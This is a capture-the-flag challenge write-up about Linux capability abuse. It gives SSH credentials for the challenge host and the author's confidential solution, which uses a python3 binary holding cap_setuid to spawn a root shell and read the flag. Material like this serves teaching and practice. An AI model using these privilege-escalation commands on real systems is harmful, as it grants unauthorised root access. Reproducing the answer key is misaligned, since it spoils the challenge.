# Linux Capability Abuse

## Challenge Overview
* **Category**: Linux System Internals
* **Difficulty**: Medium
* **Points**: 500 (Base) -> 150 (Min)
* **Author**: Cyber Crew Club

## Description
An internal Linux gateway server was audited. System administrators granted elevated capabilities to certain binaries to bypass `sudo` requirements.

SSH into the target machine, identify the misconfigured capability, elevate to root privileges, and extract `/root/flag.txt`.

Connection: `ssh operative@linux01.ctf.cybercrew.online -p 2222`  
Password: `cybercrew`

## Flag Format
`CCCTF{...}`

---

## Author Solution (Confidential)
1. Inspect file capabilities:
   ```bash
   getcap -r / 2>/dev/null
   # Output: /usr/bin/python3.11 cap_setuid=ep
   ```
2. Spawn root shell via Python `setuid(0)`:
   ```bash
   python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
   ```
3. Read flag:
   ```bash
   cat /root/flag.txt
   # CCCTF{development_only_example_linux_caps}
   ```
